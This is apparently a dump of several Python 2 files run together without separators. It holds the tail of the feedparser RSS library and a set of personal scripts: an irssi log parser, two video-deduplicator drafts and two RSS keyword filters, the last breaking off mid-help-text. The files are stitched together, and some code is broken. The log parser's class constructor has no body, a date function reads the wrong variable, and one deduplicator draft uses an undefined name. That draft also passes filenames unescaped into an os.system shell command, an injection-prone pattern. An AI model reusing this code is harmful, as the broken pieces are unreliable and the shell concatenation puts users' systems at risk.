        true_encoding = xml_encoding or 'utf-8'
    return true_encoding, http_encoding, xml_encoding, sniffed_xml_encoding, acceptable_content_type
    
def _toUTF8(data, encoding):
    '''Changes an XML data stream on the fly to specify a new encoding

    data is a raw sequence of bytes (not Unicode) that is presumed to be in %encoding already
    encoding is a string recognized by encodings.aliases
    '''
    if _debug: sys.stderr.write('entering _toUTF8, trying encoding %s\n' % encoding)
    # strip Byte Order Mark (if present)
    if (len(data) >= 4) and (data[:2] == '\xfe\xff') and (data[2:4] != '\x00\x00'):
        if _debug:
            sys.stderr.write('stripping BOM\n')
            if encoding != 'utf-16be':
                sys.stderr.write('trying utf-16be instead\n')
        encoding = 'utf-16be'
        data = data[2:]
    elif (len(data) >= 4) and (data[:2] == '\xff\xfe') and (data[2:4] != '\x00\x00'):
        if _debug:
            sys.stderr.write('stripping BOM\n')
            if encoding != 'utf-16le':
                sys.stderr.write('trying utf-16le instead\n')
        encoding = 'utf-16le'
        data = data[2:]
    elif data[:3] == '\xef\xbb\xbf':
        if _debug:
            sys.stderr.write('stripping BOM\n')
            if encoding != 'utf-8':
                sys.stderr.write('trying utf-8 instead\n')
        encoding = 'utf-8'
        data = data[3:]
    elif data[:4] == '\x00\x00\xfe\xff':
        if _debug:
            sys.stderr.write('stripping BOM\n')
            if encoding != 'utf-32be':
                sys.stderr.write('trying utf-32be instead\n')
        encoding = 'utf-32be'
        data = data[4:]
    elif data[:4] == '\xff\xfe\x00\x00':
        if _debug:
            sys.stderr.write('stripping BOM\n')
            if encoding != 'utf-32le':
                sys.stderr.write('trying utf-32le instead\n')
        encoding = 'utf-32le'
        data = data[4:]
    newdata = unicode(data, encoding)
    if _debug: sys.stderr.write('successfully converted %s data to unicode\n' % encoding)
    declmatch = re.compile('^<\?xml[^>]*?>')
    newdecl = '''<?xml version='1.0' encoding='utf-8'?>'''
    if declmatch.search(newdata):
        newdata = declmatch.sub(newdecl, newdata)
    else:
        newdata = newdecl + u'\n' + newdata
    return newdata.encode('utf-8')

def _stripDoctype(data):
    '''Strips DOCTYPE from XML document, returns (rss_version, stripped_data)

    rss_version may be 'rss091n' or None
    stripped_data is the same XML document, minus the DOCTYPE
    '''
    entity_pattern = re.compile(r'<!ENTITY([^>]*?)>', re.MULTILINE)
    data = entity_pattern.sub('', data)
    doctype_pattern = re.compile(r'<!DOCTYPE([^>]*?)>', re.MULTILINE)
    doctype_results = doctype_pattern.findall(data)
    doctype = doctype_results and doctype_results[0] or ''
    if doctype.lower().count('netscape'):
        version = 'rss091n'
    else:
        version = None
    data = doctype_pattern.sub('', data)
    return version, data
    
def parse(url_file_stream_or_string, etag=None, modified=None, agent=None, referrer=None, handlers=[]):
    '''Parse a feed from a URL, file, stream, or string'''
    result = FeedParserDict()
    result['feed'] = FeedParserDict()
    result['entries'] = []
    if _XML_AVAILABLE:
        result['bozo'] = 0
    if type(handlers) == types.InstanceType:
        handlers = [handlers]
    try:
        f = _open_resource(url_file_stream_or_string, etag, modified, agent, referrer, handlers)
        data = f.read()
    except Exception, e:
        result['bozo'] = 1
        result['bozo_exception'] = e
        data = ''
        f = None

    # if feed is gzip-compressed, decompress it
    if f and data and hasattr(f, 'headers'):
        if gzip and f.headers.get('content-encoding', '') == 'gzip':
            try:
                data = gzip.GzipFile(fileobj=_StringIO(data)).read()
            except Exception, e:
                # Some feeds claim to be gzipped but they're not, so
                # we get garbage.  Ideally, we should re-request the
                # feed without the 'Accept-encoding: gzip' header,
                # but we don't.
                result['bozo'] = 1
                result['bozo_exception'] = e
                data = ''
        elif zlib and f.headers.get('content-encoding', '') == 'deflate':
            try:
                data = zlib.decompress(data, -zlib.MAX_WBITS)
            except Exception, e:
                result['bozo'] = 1
                result['bozo_exception'] = e
                data = ''

    # save HTTP headers
    if hasattr(f, 'info'):
        info = f.info()
        result['etag'] = info.getheader('ETag')
        last_modified = info.getheader('Last-Modified')
        if last_modified:
            result['modified'] = _parse_date(last_modified)
    if hasattr(f, 'url'):
        result['href'] = f.url
        result['status'] = 200
    if hasattr(f, 'status'):
        result['status'] = f.status
    if hasattr(f, 'headers'):
        result['headers'] = f.headers.dict
    if hasattr(f, 'close'):
        f.close()

    # there are four encodings to keep track of:
    # - http_encoding is the encoding declared in the Content-Type HTTP header
    # - xml_encoding is the encoding declared in the <?xml declaration
    # - sniffed_encoding is the encoding sniffed from the first 4 bytes of the XML data
    # - result['encoding'] is the actual encoding, as per RFC 3023 and a variety of other conflicting specifications
    http_headers = result.get('headers', {})
    result['encoding'], http_encoding, xml_encoding, sniffed_xml_encoding, acceptable_content_type = \
        _getCharacterEncoding(http_headers, data)
    if http_headers and (not acceptable_content_type):
        if http_headers.has_key('content-type'):
            bozo_message = '%s is not an XML media type' % http_headers['content-type']
        else:
            bozo_message = 'no Content-type specified'
        result['bozo'] = 1
        result['bozo_exception'] = NonXMLContentType(bozo_message)
        
    result['version'], data = _stripDoctype(data)

    baseuri = http_headers.get('content-location', result.get('href'))
    baselang = http_headers.get('content-language', None)

    # if server sent 304, we're done
    if result.get('status', 0) == 304:
        result['version'] = ''
        result['debug_message'] = 'The feed has not changed since you last checked, ' + \
            'so the server sent no data.  This is a feature, not a bug!'
        return result

    # if there was a problem downloading, we're done
    if not data:
        return result

    # determine character encoding
    use_strict_parser = 0
    known_encoding = 0
    tried_encodings = []
    # try: HTTP encoding, declared XML encoding, encoding sniffed from BOM
    for proposed_encoding in (result['encoding'], xml_encoding, sniffed_xml_encoding):
        if not proposed_encoding: continue
        if proposed_encoding in tried_encodings: continue
        tried_encodings.append(proposed_encoding)
        try:
            data = _toUTF8(data, proposed_encoding)
            known_encoding = use_strict_parser = 1
            break
        except:
            pass
    # if no luck and we have auto-detection library, try that
    if (not known_encoding) and chardet:
        try:
            proposed_encoding = chardet.detect(data)['encoding']
            if proposed_encoding and (proposed_encoding not in tried_encodings):
                tried_encodings.append(proposed_encoding)
                data = _toUTF8(data, proposed_encoding)
                known_encoding = use_strict_parser = 1
        except:
            pass
    # if still no luck and we haven't tried utf-8 yet, try that
    if (not known_encoding) and ('utf-8' not in tried_encodings):
        try:
            proposed_encoding = 'utf-8'
            tried_encodings.append(proposed_encoding)
            data = _toUTF8(data, proposed_encoding)
            known_encoding = use_strict_parser = 1
        except:
            pass
    # if still no luck and we haven't tried windows-1252 yet, try that
    if (not known_encoding) and ('windows-1252' not in tried_encodings):
        try:
            proposed_encoding = 'windows-1252'
            tried_encodings.append(proposed_encoding)
            data = _toUTF8(data, proposed_encoding)
            known_encoding = use_strict_parser = 1
        except:
            pass
    # if still no luck, give up
    if not known_encoding:
        result['bozo'] = 1
        result['bozo_exception'] = CharacterEncodingUnknown( \
            'document encoding unknown, I tried ' + \
            '%s, %s, utf-8, and windows-1252 but nothing worked' % \
            (result['encoding'], xml_encoding))
        result['encoding'] = ''
    elif proposed_encoding != result['encoding']:
        result['bozo'] = 1
        result['bozo_exception'] = CharacterEncodingOverride( \
            'documented declared as %s, but parsed as %s' % \
            (result['encoding'], proposed_encoding))
        result['encoding'] = proposed_encoding

    if not _XML_AVAILABLE:
        use_strict_parser = 0
    if use_strict_parser:
        # initialize the SAX parser
        feedparser = _StrictFeedParser(baseuri, baselang, 'utf-8')
        saxparser = xml.sax.make_parser(PREFERRED_XML_PARSERS)
        saxparser.setFeature(xml.sax.handler.feature_namespaces, 1)
        saxparser.setContentHandler(feedparser)
        saxparser.setErrorHandler(feedparser)
        source = xml.sax.xmlreader.InputSource()
        source.setByteStream(_StringIO(data))
        if hasattr(saxparser, '_ns_stack'):
            # work around bug in built-in SAX parser (doesn't recognize xml: namespace)
            # PyXML doesn't have this problem, and it doesn't have _ns_stack either
            saxparser._ns_stack.append({'http://www.w3.org/XML/1998/namespace':'xml'})
        try:
            saxparser.parse(source)
        except Exception, e:
            if _debug:
                import traceback
                traceback.print_stack()
                traceback.print_exc()
                sys.stderr.write('xml parsing failed\n')
            result['bozo'] = 1
            result['bozo_exception'] = feedparser.exc or e
            use_strict_parser = 0
    if not use_strict_parser:
        feedparser = _LooseFeedParser(baseuri, baselang, known_encoding and 'utf-8' or '')
        feedparser.feed(data)
    result['feed'] = feedparser.feeddata
    result['entries'] = feedparser.entries
    result['version'] = result['version'] or feedparser.version
    result['namespaces'] = feedparser.namespacesInUse
    return result

if __name__ == '__main__':
    if not sys.argv[1:]:
        print __doc__
        sys.exit(0)
    else:
        urls = sys.argv[1:]
    zopeCompatibilityHack()
    from pprint import pprint
    for url in urls:
        print url
        print
        result = parse(url)
        pprint(result)
        print

#REVISION HISTORY
#1.0 - 9/27/2002 - MAP - fixed namespace processing on prefixed RSS 2.0 elements,
#  added Simon Fell's test suite
#1.1 - 9/29/2002 - MAP - fixed infinite loop on incomplete CDATA sections
#2.0 - 10/19/2002
#  JD - use inchannel to watch out for image and textinput elements which can
#  also contain title, link, and description elements
#  JD - check for isPermaLink='false' attribute on guid elements
#  JD - replaced openAnything with open_resource supporting ETag and
#  If-Modified-Since request headers
#  JD - parse now accepts etag, modified, agent, and referrer optional
#  arguments
#  JD - modified parse to return a dictionary instead of a tuple so that any
#  etag or modified information can be returned and cached by the caller
#2.0.1 - 10/21/2002 - MAP - changed parse() so that if we don't get anything
#  because of etag/modified, return the old etag/modified to the caller to
#  indicate why nothing is being returned
#2.0.2 - 10/21/2002 - JB - added the inchannel to the if statement, otherwise its
#  useless.  Fixes the problem JD was addressing by adding it.
#2.1 - 11/14/2002 - MAP - added gzip support
#2.2 - 1/27/2003 - MAP - added attribute support, admin:generatorAgent.
#  start_admingeneratoragent is an example of how to handle elements with
#  only attributes, no content.
#2.3 - 6/11/2003 - MAP - added USER_AGENT for default (if caller doesn't specify);
#  also, make sure we send the User-Agent even if urllib2 isn't available.
#  Match any variation of backend.userland.com/rss namespace.
#2.3.1 - 6/12/2003 - MAP - if item has both link and guid, return both as-is.
#2.4 - 7/9/2003 - MAP - added preliminary Pie/Atom/Echo support based on Sam Ruby's
#  snapshot of July 1 <http://www.intertwingly.net/blog/1506.html>; changed
#  project name
#2.5 - 7/25/2003 - MAP - changed to Python license (all contributors agree);
#  removed unnecessary urllib code -- urllib2 should always be available anyway;
#  return actual url, status, and full HTTP headers (as result['url'],
#  result['status'], and result['headers']) if parsing a remote feed over HTTP --
#  this should pass all the HTTP tests at <http://diveintomark.org/tests/client/http/>;
#  added the latest namespace-of-the-week for RSS 2.0
#2.5.1 - 7/26/2003 - RMK - clear opener.addheaders so we only send our custom
#  User-Agent (otherwise urllib2 sends two, which confuses some servers)
#2.5.2 - 7/28/2003 - MAP - entity-decode inline xml properly; added support for
#  inline <xhtml:body> and <xhtml:div> as used in some RSS 2.0 feeds
#2.5.3 - 8/6/2003 - TvdV - patch to track whether we're inside an image or
#  textInput, and also to return the character encoding (if specified)
#2.6 - 1/1/2004 - MAP - dc:author support (MarekK); fixed bug tracking
#  nested divs within content (JohnD); fixed missing sys import (JohanS);
#  fixed regular expression to capture XML character encoding (Andrei);
#  added support for Atom 0.3-style links; fixed bug with textInput tracking;
#  added support for cloud (MartijnP); added support for multiple
#  category/dc:subject (MartijnP); normalize content model: 'description' gets
#  description (which can come from description, summary, or full content if no
#  description), 'content' gets dict of base/language/type/value (which can come
#  from content:encoded, xhtml:body, content, or fullitem);
#  fixed bug matching arbitrary Userland namespaces; added xml:base and xml:lang
#  tracking; fixed bug tracking unknown tags; fixed bug tracking content when
#  <content> element is not in default namespace (like Pocketsoap feed);
#  resolve relative URLs in link, guid, docs, url, comments, wfw:comment,
#  wfw:commentRSS; resolve relative URLs within embedded HTML markup in
#  description, xhtml:body, content, content:encoded, title, subtitle,
#  summary, info, tagline, and copyright; added support for pingback and
#  trackback namespaces
#2.7 - 1/5/2004 - MAP - really added support for trackback and pingback
#  namespaces, as opposed to 2.6 when I said I did but didn't really;
#  sanitize HTML markup within some elements; added mxTidy support (if
#  installed) to tidy HTML markup within some elements; fixed indentation
#  bug in _parse_date (FazalM); use socket.setdefaulttimeout if available
#  (FazalM); universal date parsing and normalization (FazalM): 'created', modified',
#  'issued' are parsed into 9-tuple date format and stored in 'created_parsed',
#  'modified_parsed', and 'issued_parsed'; 'date' is duplicated in 'modified'
#  and vice-versa; 'date_parsed' is duplicated in 'modified_parsed' and vice-versa
#2.7.1 - 1/9/2004 - MAP - fixed bug handling &quot; and &apos;.  fixed memory
#  leak not closing url opener (JohnD); added dc:publisher support (MarekK);
#  added admin:errorReportsTo support (MarekK); Python 2.1 dict support (MarekK)
#2.7.4 - 1/14/2004 - MAP - added workaround for improperly formed <br/> tags in
#  encoded HTML (skadz); fixed unicode handling in normalize_attrs (ChrisL);
#  fixed relative URI processing for guid (skadz); added ICBM support; added
#  base64 support
#2.7.5 - 1/15/2004 - MAP - added workaround for malformed DOCTYPE (seen on many
#  blogspot.com sites); added _debug variable
#2.7.6 - 1/16/2004 - MAP - fixed bug with StringIO importing
#3.0b3 - 1/23/2004 - MAP - parse entire feed with real XML parser (if available);
#  added several new supported namespaces; fixed bug tracking naked markup in
#  description; added support for enclosure; added support for source; re-added
#  support for cloud which got dropped somehow; added support for expirationDate
#3.0b4 - 1/26/2004 - MAP - fixed xml:lang inheritance; fixed multiple bugs tracking
#  xml:base URI, one for documents that don't define one explicitly and one for
#  documents that define an outer and an inner xml:base that goes out of scope
#  before the end of the document
#3.0b5 - 1/26/2004 - MAP - fixed bug parsing multiple links at feed level
#3.0b6 - 1/27/2004 - MAP - added feed type and version detection, result['version']
#  will be one of SUPPORTED_VERSIONS.keys() or empty string if unrecognized;
#  added support for creativeCommons:license and cc:license; added support for
#  full Atom content model in title, tagline, info, copyright, summary; fixed bug
#  with gzip encoding (not always telling server we support it when we do)
#3.0b7 - 1/28/2004 - MAP - support Atom-style author element in author_detail
#  (dictionary of 'name', 'url', 'email'); map author to author_detail if author
#  contains name + email address
#3.0b8 - 1/28/2004 - MAP - added support for contributor
#3.0b9 - 1/29/2004 - MAP - fixed check for presence of dict function; added
#  support for summary
#3.0b10 - 1/31/2004 - MAP - incorporated ISO-8601 date parsing routines from
#  xml.util.iso8601
#3.0b11 - 2/2/2004 - MAP - added 'rights' to list of elements that can contain
#  dangerous markup; fiddled with decodeEntities (not right); liberalized
#  date parsing even further
#3.0b12 - 2/6/2004 - MAP - fiddled with decodeEntities (still not right);
#  added support to Atom 0.2 subtitle; added support for Atom content model
#  in copyright; better sanitizing of dangerous HTML elements with end tags
#  (script, frameset)
#3.0b13 - 2/8/2004 - MAP - better handling of empty HTML tags (br, hr, img,
#  etc.) in embedded markup, in either HTML or XHTML form (<br>, <br/>, <br />)
#3.0b14 - 2/8/2004 - MAP - fixed CDATA handling in non-wellformed feeds under
#  Python 2.1
#3.0b15 - 2/11/2004 - MAP - fixed bug resolving relative links in wfw:commentRSS;
#  fixed bug capturing author and contributor URL; fixed bug resolving relative
#  links in author and contributor URL; fixed bug resolvin relative links in
#  generator URL; added support for recognizing RSS 1.0; passed Simon Fell's
#  namespace tests, and included them permanently in the test suite with his
#  permission; fixed namespace handling under Python 2.1
#3.0b16 - 2/12/2004 - MAP - fixed support for RSS 0.90 (broken in b15)
#3.0b17 - 2/13/2004 - MAP - determine character encoding as per RFC 3023
#3.0b18 - 2/17/2004 - MAP - always map description to summary_detail (Andrei);
#  use libxml2 (if available)
#3.0b19 - 3/15/2004 - MAP - fixed bug exploding author information when author
#  name was in parentheses; removed ultra-problematic mxTidy support; patch to
#  workaround crash in PyXML/expat when encountering invalid entities
#  (MarkMoraes); support for textinput/textInput
#3.0b20 - 4/7/2004 - MAP - added CDF support
#3.0b21 - 4/14/2004 - MAP - added Hot RSS support
#3.0b22 - 4/19/2004 - MAP - changed 'channel' to 'feed', 'item' to 'entries' in
#  results dict; changed results dict to allow getting values with results.key
#  as well as results[key]; work around embedded illformed HTML with half
#  a DOCTYPE; work around malformed Content-Type header; if character encoding
#  is wrong, try several common ones before falling back to regexes (if this
#  works, bozo_exception is set to CharacterEncodingOverride); fixed character
#  encoding issues in BaseHTMLProcessor by tracking encoding and converting
#  from Unicode to raw strings before feeding data to sgmllib.SGMLParser;
#  convert each value in results to Unicode (if possible), even if using
#  regex-based parsing
#3.0b23 - 4/21/2004 - MAP - fixed UnicodeDecodeError for feeds that contain
#  high-bit characters in attributes in embedded HTML in description (thanks
#  Thijs van de Vossen); moved guid, date, and date_parsed to mapped keys in
#  FeedParserDict; tweaked FeedParserDict.has_key to return True if asking
#  about a mapped key
#3.0fc1 - 4/23/2004 - MAP - made results.entries[0].links[0] and
#  results.entries[0].enclosures[0] into FeedParserDict; fixed typo that could
#  cause the same encoding to be tried twice (even if it failed the first time);
#  fixed DOCTYPE stripping when DOCTYPE contained entity declarations;
#  better textinput and image tracking in illformed RSS 1.0 feeds
#3.0fc2 - 5/10/2004 - MAP - added and passed Sam's amp tests; added and passed
#  my blink tag tests
#3.0fc3 - 6/18/2004 - MAP - fixed bug in _changeEncodingDeclaration that
#  failed to parse utf-16 encoded feeds; made source into a FeedParserDict;
#  duplicate admin:generatorAgent/@rdf:resource in generator_detail.url;
#  added support for image; refactored parse() fallback logic to try other
#  encodings if SAX parsing fails (previously it would only try other encodings
#  if re-encoding failed); remove unichr madness in normalize_attrs now that
#  we're properly tracking encoding in and out of BaseHTMLProcessor; set
#  feed.language from root-level xml:lang; set entry.id from rdf:about;
#  send Accept header
#3.0 - 6/21/2004 - MAP - don't try iso-8859-1 (can't distinguish between
#  iso-8859-1 and windows-1252 anyway, and most incorrectly marked feeds are
#  windows-1252); fixed regression that could cause the same encoding to be
#  tried twice (even if it failed the first time)
#3.0.1 - 6/22/2004 - MAP - default to us-ascii for all text/* content types;
#  recover from malformed content-type header parameter with no equals sign
#  ('text/xml; charset:iso-8859-1')
#3.1 - 6/28/2004 - MAP - added and passed tests for converting HTML entities
#  to Unicode equivalents in illformed feeds (aaronsw); added and
#  passed tests for converting character entities to Unicode equivalents
#  in illformed feeds (aaronsw); test for valid parsers when setting
#  XML_AVAILABLE; make version and encoding available when server returns
#  a 304; add handlers parameter to pass arbitrary urllib2 handlers (like
#  digest auth or proxy support); add code to parse username/password
#  out of url and send as basic authentication; expose downloading-related
#  exceptions in bozo_exception (aaronsw); added __contains__ method to
#  FeedParserDict (aaronsw); added publisher_detail (aaronsw)
#3.2 - 7/3/2004 - MAP - use cjkcodecs and iconv_codec if available; always
#  convert feed to UTF-8 before passing to XML parser; completely revamped
#  logic for determining character encoding and attempting XML parsing
#  (much faster); increased default timeout to 20 seconds; test for presence
#  of Location header on redirects; added tests for many alternate character
#  encodings; support various EBCDIC encodings; support UTF-16BE and
#  UTF16-LE with or without a BOM; support UTF-8 with a BOM; support
#  UTF-32BE and UTF-32LE with or without a BOM; fixed crashing bug if no
#  XML parsers are available; added support for 'Content-encoding: deflate';
#  send blank 'Accept-encoding: ' header if neither gzip nor zlib modules
#  are available
#3.3 - 7/15/2004 - MAP - optimize EBCDIC to ASCII conversion; fix obscure
#  problem tracking xml:base and xml:lang if element declares it, child
#  doesn't, first grandchild redeclares it, and second grandchild doesn't;
#  refactored date parsing; defined public registerDateHandler so callers
#  can add support for additional date formats at runtime; added support
#  for OnBlog, Nate, MSSQL, Greek, and Hungarian dates (ytrewq1); added
#  zopeCompatibilityHack() which turns FeedParserDict into a regular
#  dictionary, required for Zope compatibility, and also makes command-
#  line debugging easier because pprint module formats real dictionaries
#  better than dictionary-like objects; added NonXMLContentType exception,
#  which is stored in bozo_exception when a feed is served with a non-XML
#  media type such as 'text/plain'; respect Content-Language as default
#  language if not xml:lang is present; cloud dict is now FeedParserDict;
#  generator dict is now FeedParserDict; better tracking of xml:lang,
#  including support for xml:lang='' to unset the current language;
#  recognize RSS 1.0 feeds even when RSS 1.0 namespace is not the default
#  namespace; don't overwrite final status on redirects (scenarios:
#  redirecting to a URL that returns 304, redirecting to a URL that
#  redirects to another URL with a different type of redirect); add
#  support for HTTP 303 redirects
#4.0 - MAP - support for relative URIs in xml:base attribute; fixed
#  encoding issue with mxTidy (phopkins); preliminary support for RFC 3229;
#  support for Atom 1.0; support for iTunes extensions; new 'tags' for
#  categories/keywords/etc. as array of dict
#  {'term': term, 'scheme': scheme, 'label': label} to match Atom 1.0
#  terminology; parse RFC 822-style dates with no time; lots of other
#  bug fixes
#4.1 - MAP - removed socket timeout; added support for chardet library
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#~ NONAME v0.0.0 (dd.mm.yy) by Bystroushaak - bystrousak@kitakitsune.org.
#~ This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
#~ Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
#~ Created in §Editor text editor.
#~
##~ Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
##~ emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
##~ U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
##~ i nekomu jinemu nez me. Diky
#~
#~ Notes:
    #~  
# imports
import sys

from datetime import datetime

# variables
if len(sys.argv) < 2:
    print "Missing infile!"
    sys.exit()
else:
    filename = sys.argv[1]

# functions & objects
class Line():
    def __init__(self, str):

    def analyzeLine(self, str):
        type= ""
        nick = ""
        msg = ""
        status= "-"
        time = str[:5]
        str = str[6:]

        ## --- Log opened Tue Aug 25 19:48:21 2009

        if str.startswith("-!-"):   # pokud se jedna o zpravu serveru
            type = "server_msg"
        elif str.startswith(" * "): # pokud se jedna o akci uzivatele
            type = "usr_action"
            ## z textu vyparsuje nick a msg
            tmp = False
            for i in msg[9:]:
                if i == " " and not tmp:
                    tmp = True
                else:
                    nick += i
                    
                if tmp:
                    msg += i
            msg = msg[1:]
        elif str.startswith("<"):
            type = "user_msg"


class DayLog():                     ## pridat metody pro vypis do html - hlavicku, kodovani atp..
    def __init__(self, data):
        self.date = self.parseDate(data[0])
        self.lines = self.analyzeData(data[1:])

    def parseDate(self, strdate):   # parsovani datumu z irssi formatu
        strdate = strdate[16:]

        return datetime.strptime(str[16:], "%a %b %d %Y")

    def analyzeData(self, data):
        lines = []
        for i in data:
            lines.append(Line(i))

        return lines
    
# main program
try:
    file = open(filename, "r")
    data = file.readlines()
    file.close()
except IOError, e:
    print "Bad filename!"
    sys.exit()

## ponecha pouze zname dny (prvni den ze ktereho je jen fragment je zahozen)
tmp = []
lck = False
for i in data:
    if i.startswith("--- Day changed"):
        lck = True

    if lck:
        tmp.append(i)
data = tmp























    
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__name    = "Video Deduplikator"
__version = "0.0.1"
__date    = "19.11.2012"
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
# 
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Sublime text 2 editor.
#
# Notes:
    # 
#= Imports =====================================================================
import sh
import os
import os.path


#= Variables ===================================================================
frames = 1000
skip_f = 300
HASH_DIR = "dd_hashes"
SLASH_REPLACER = ".-."



#= Functions & objects =========================================================
def process(n):
	dn = n.replace("/", SLASH_REPLACER)

	sh.cd(HASH_DIR)
	if not os.path.exists(dn):
		sh.mkdir(dn)

	sh.cd(dn)

	print n
	# sh.mplayer("-really-quiet", "-vo", "png", "-frames", str(frames), "-ao", "null", "../../" + n)
	sh.mogrify("-resize", "10x10!", "-threshold", "50%", "-format", "bmp", sh.glob("*"))
	sh.rm(sh.glob("*.png"))

	sh.cd("../..")


def tree(path, fn):
	for root, dirs, files in os.walk(path, topdown=False):
		for name in filter(lambda x: x.endswith(".flv") or not "." in x, files):
			fn(root + "/".join(dirs) + "/" + name)


#= Main program ================================================================
if __name__ == '__main__':
	print __name + " v" + __version + " (" + __date + ") by " + __author + " (" + __email + ")"
	if not os.path.exists(HASH_DIR):
		os.makedirs(HASH_DIR)

	tree("p", process) # os.getcwd()#! /usr/bin/env python
# -*- coding: utf-8 -*-
import os
import os.path




frames = 1000
skip_f = 300
hash_dir = "dd_hashes"



def process(n):
	if not os.path.exists(HASH_DIR):
		os.makedirs(HASH_DIR)
	
	os.system("mplayer -really-quiet -vo png -frames " + str(frames) + " -ao null " + n)
	



for root, dirs, files in os.walk(os.getcwd(), topdown=False):
	for name in filter(lambda x: x.endswith(".flv") or not "." in x, files):
		process(name)
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# RSSFilter.py v1.0.1 (21.03.2010) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in §Editor text editor.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky.
#
#   If you want to use this script, I'd be happy if you drop me a small feedback message. For example 
#   something about where you use this script, or just a message that this script is useful for you.
#   For most of my scripts, I dont know if they are forgotten, or they are usefull for other people.
#   Thanks.
#   
#
# Notes:
    # python RSSFilter.py http://www.itnews.sk/xml/vsetky_spravy.rss dc:subject bezpečnosť
    # Do budoucna predelat script na lepsi parsovani parametru.
    # Pridat moznost nacitat informace z stdin.
#===============================================================================
# Imports ======================================================================
#===============================================================================
import sys
import urllib
try:
    from BeautifulSoup import BeautifulStoneSoup as BS
except ImportError, e:
    print
    print ">>> Error;", e, "!! <<<"
    print ">>> This program needs BeautifulSoup!"
    print "!!! You can download it here; http://www.crummy.com/software/BeautifulSoup/"
    print ">>> Or you can try find it in repostories for your linux distribution."
    print  
    
    raise e


#===============================================================================
#= Functions & objects =========================================================
#===============================================================================
def printHelp():
    print
    print "RSSFilter v1.0.1 (21.04.2010) by Bystroushaak (bystrousak@kitakitsune.org)"
    print
    print "This script downloads given url pointing to RSS feed and erase all items which"
    print "dont have given keywords in given tag."
    print "Output is writen into stdin."
    print
    print "\t RSSFilter.py [-n] link tag keyword1 [keyword2 .. keywordn]"
    print
    print "\t\t -n"
    print "\t\t\t Negative logic - pass all except items which have tag"
    print "\t\t\t with keywords."
    print
    print "\t\t link"
    print "\t\t\t Link to xml file with RSS. Must starts with http://"
    print
    print "\t\t tag"
    print "\t\t\t Tag where script will be looking for keywords"
    print
    print "\t\t keywords"
    print "\t\t\t Keywords for filtering."
    print
  
# z vystupu odstrani zbytecne prazdne radky
def removeNewlines(text):
    tmp = str(text).splitlines()
    
    data = ""
    for i in range(len(tmp) - 1):
        if tmp[i] == "" and tmp[i + 1] == "":
            continue
        else:
            data += tmp[i] + "\n"
    data += tmp[-1]
    
    return data

#===============================================================================
#= Main program ================================================================
#===============================================================================
# zkontroluje jestli ma script dostatek parametru, pokud ne, tak vypise napovedu
if len(sys.argv) < 3:
    printHelp()
    sys.exit()
else:
    negativeflag = False
    
    for i in sys.argv:
        if "-n" == i:
            negativeflag = True
            break
    
    if negativeflag:
        addr     = sys.argv[2]
        tag      = sys.argv[3]
        keywords = sys.argv[4:]
    else:
        addr     = sys.argv[1]
        tag      = sys.argv[2]
        keywords = sys.argv[3:]

# zkontroluje pritomnost odkazu v parametrech
if not "http" in addr:
    print "Couldn't find link in parameters!"
    printHelp()
    sys.exit()

# stahne stranku
try:
    fp = urllib.urlopen(addr)
    data = fp.read()
    fp.close()
except:
    print "Cant download", addr
    sys.exit()
    
# pomoci BeautifulSoup odtrani nechtene itemy
soup = BS(data)
for item in soup("item"):  
    # odstraneni nevyhovujicich polozek
    for key in keywords:
        if negativeflag:
            if key in str(item(tag)[0]):
                item.extract()
        else:
            if not key in str(item(tag)[0]):
                item.extract()

tmp = str(soup)            # vystup prevede zpet na text
tmp = tmp.replace("rdf:rdf", "rdf:RDF") # nepekny hack, ale funkcni (BeautifulSoup predela vsechny tagy na lc a kvuli tomu je feed nevalidni pokud tam je RDF)
print removeNewlines(tmp)  # vypise text upraveny tak aby neobsahoval zbytecne prazdne radky


#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# RSSFilter.py v1.0.1 (21.03.2010) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in §Editor text editor.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky.
#
#   If you want to use this script, I'd be happy if you drop me a small feedback message. For example 
#   something about where you use this script, or just a message that this script is useful for you.
#   For most of my scripts, I dont know if they are forgotten, or they are usefull for other people.
#   Thanks.
#   
#
# Notes:
    # Pridat moznost nacitat informace z stdin.
#===============================================================================
# Imports ======================================================================
#===============================================================================
import sys
import urllib
try:
    import feedparser
except ImportError, e:
    print
    print ">>> Error;", e, "!! <<<"
    print ">>> This program needs feedparser!"
    print "!!! You can download it here; http://www.feedparser.org"
    print ">>> Or you can try find it in repostories for your linux distribution."
    print  
    
    raise e


#===============================================================================
#= Functions & objects =========================================================
#===============================================================================
def printHelp():
    print
    print "RSSFilter v2.0.1 (25.05.2010) by Bystroushaak (bystrousak@kitakitsune.org)"
    print
    print "This script downloads given url pointing to RSS feed and erase all items which"
    print "dont have given keywords in given tag."
    print "Output is writen into stdin."
    print
